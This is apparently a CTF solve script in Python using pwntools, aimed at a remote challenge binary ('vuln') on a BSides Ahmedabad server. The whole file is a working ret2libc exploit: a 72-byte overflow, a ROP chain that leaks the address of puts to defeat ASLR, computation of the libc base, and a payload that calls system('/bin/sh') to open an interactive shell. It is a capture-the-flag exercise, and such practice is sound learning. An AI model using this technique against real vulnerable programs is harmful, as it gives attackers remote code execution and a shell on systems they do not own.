#!/usr/bin/python3

#
# NOTE : THIS CODE WAS TAKEN FROM https://stacklikemind.io/ret2libc-aslr AND MODIFIED FOR THE PURPOSE TO SOLVE THE CHALLENGE EASILY.
#        IT'S RECOMMENDED TO READ THE ARTICLE!.
#

from pwn import *
from struct import pack

p = remote('pwn2.bsidesahmedabad.in', 9001)

binary = ELF('./vuln')
context.binary = binary #this is needed so a correct rop chain based on the binary arch can be generated
rop = ROP(binary)

libc = ELF('./libc-2.31.so')

rop.raw("A" * 72)
rop.puts(binary.got['puts'])

ret = 0x040101a
pop_rdi_ret = 0x0401273
main_addr = 0x004010b0

rop.call(main_addr) # main function

log.info("obtaining address leak of puts:\n" +rop.dump())

p.recvuntil("\n")
p.sendline(rop.chain())
p.recvuntil("\n")
leakedPuts = p.recvline()[:8].strip()
log.success("Leaked puts@GLIBC: {}".format(leakedPuts))

leakedPuts = int.from_bytes(leakedPuts, byteorder='little')

libc.address = leakedPuts - libc.symbols["puts"]
rop2 = ROP(libc)
rop2.raw("A" * 72)

pop_rdi = p64(pop_rdi_ret) # pop_rdi address
sh = p64(next(libc.search(b'/bin/sh'))) # target libc
sys = p64(libc.symbols['system'])
padding = b"A"*72

#stack alignment for movaps instruction ubuntu
# simple pointer to a ret function just to keep the stackaligned by 16 bytes
stack_alignment = p64(ret)

p.recvuntil("\n")
payload = padding + pop_rdi + sh + stack_alignment + sys #stacklignment is only needed for ubuntu

print(sh)
p.sendline(payload)
p.recvuntil("\n")

p.interactive()
